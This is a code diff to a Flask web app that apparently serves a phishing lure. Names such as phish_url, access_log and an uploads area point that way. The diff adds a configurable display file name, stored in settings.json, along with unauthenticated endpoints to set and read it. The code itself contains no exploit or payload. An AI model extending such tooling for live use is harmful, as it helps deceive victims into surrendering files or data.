@@ -11,7 +11,20 @@ app = Flask(__name__)
 UPLOAD_FOLDER = 'uploads'
 LOG_FILE = 'access_log.txt'
 PHISH_URL_FILE = 'phish_url.json'
+SETTINGS_FILE = 'settings.json'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
+def get_settings():
+    if os.path.exists(SETTINGS_FILE):
+        with open(SETTINGS_FILE, 'r') as f:
+            return json.load(f)
+    return {}
+
+def save_settings(data):
+    settings = get_settings()
+    settings.update(data)
+    with open(SETTINGS_FILE, 'w') as f:
+        json.dump(settings, f)
 
 def get_phish_url():
     if os.path.exists(PHISH_URL_FILE):
@@ -24,6 +37,10 @@ def save_phish_url(url):
     with open(PHISH_URL_FILE, 'w') as f:
         json.dump({'url': url}, f)
 
+def get_file_name():
+    settings = get_settings()
+    return settings.get('file_name', '')
+
 @app.after_request
 def add_no_cache(response):
     response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
@@ -31,7 +48,7 @@ def add_no_cache(response):
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('index.html', file_name=get_file_name())
 
 @app.route('/upload-files', methods=['POST'])
 def upload_files():
@@ -68,7 +85,7 @@ def files_page():
                     'file_count': file_count,
                     'size': size_str
                 })
-    return render_template('files.html', folders=folders, phish_url=get_phish_url())
+    return render_template('files.html', folders=folders, phish_url=get_phish_url(), file_name=get_file_name())
 
 @app.route('/access/<folder_name>')
 def view_folder(folder_name):
@@ -113,6 +130,17 @@ def update_phish_url():
     url = data.get('url', '')
     save_phish_url(url)
     return jsonify({'status': 'ok'})
+
+@app.route('/update-file-name', methods=['POST'])
+def update_file_name():
+    data = request.get_json()
+    file_name = data.get('file_name', '')
+    save_settings({'file_name': file_name})
+    return jsonify({'status': 'ok'})
+
+@app.route('/get-file-name')
+def get_file_name_api():
+    return jsonify({'file_name': get_file_name()})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
